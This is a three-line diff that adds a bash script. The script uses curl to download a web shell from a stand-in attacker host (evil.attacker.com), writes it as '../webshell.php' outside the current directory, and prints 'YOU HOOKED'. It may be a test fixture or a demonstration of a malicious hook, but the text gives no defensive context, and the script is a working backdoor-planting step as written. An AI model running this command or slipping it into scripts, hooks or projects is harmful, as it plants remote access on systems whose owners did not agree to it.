@@ -1,0 +1,3 @@
+#!/usr/bin/bash
+curl http://evil.attacker.com/ -o "../webshell.php"
+echo "YOU HOOKED"
